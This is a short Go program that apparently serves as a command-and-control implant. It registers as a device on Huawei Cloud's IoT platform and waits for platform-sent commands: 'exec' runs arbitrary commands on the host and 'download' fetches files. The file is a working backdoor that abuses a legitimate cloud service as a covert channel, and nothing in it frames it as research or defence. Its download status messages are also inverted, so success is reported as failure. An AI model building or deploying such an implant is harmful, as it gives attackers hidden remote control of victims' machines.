package main

import (
	"flag"
	"fmt"
	iot "github.com/ctlove0523/huaweicloud-iot-device-sdk-go"
	"hw-iot-c2/core"
	"time"
)

var device iot.Device

type Option struct {
	id       string
	password string
	servers  string
}

func main() {
	var opt Option
	flag.StringVar(&opt.id, "id", "", "device id")
	flag.StringVar(&opt.password, "pass", "", "device password")
	flag.StringVar(&opt.servers, "server", "", "iot server")
	flag.Parse()

	if opt.id == "" && opt.password == "" && opt.servers == "" {
		//flag.Usage()
		return
	}

	// 创建一个设备并初始化
	device = iot.CreateIotDevice(opt.id, opt.password, opt.servers)

	device.Init()
	if device.IsConnected() {
		fmt.Println("device connect huawei iot platform success")
	} else {
		fmt.Println("device connect huawei iot platform failed")
	}

	// 添加用于处理平台下发命令的callback
	device.AddCommandHandler(handleCommand)
	time.Sleep(1 * time.Minute)

	var forever chan struct{}
	<-forever

}

func handleCommand(command iot.Command) (bool, interface{}) {
	content := ""
	data := command.Paras.(map[string]interface{})
	fmt.Println(data)
	paras := data["paras"].(string)
	switch command.CommandName {
	case "exec":
		content = core.ExecCommand(paras)
	case "download":
		if device.DownloadFile(paras) {
			content = fmt.Sprintf("Download %s is failed!", paras)
		} else {
			content = fmt.Sprintf("Download %s is success!", paras)
		}
	}

	return true, content
}
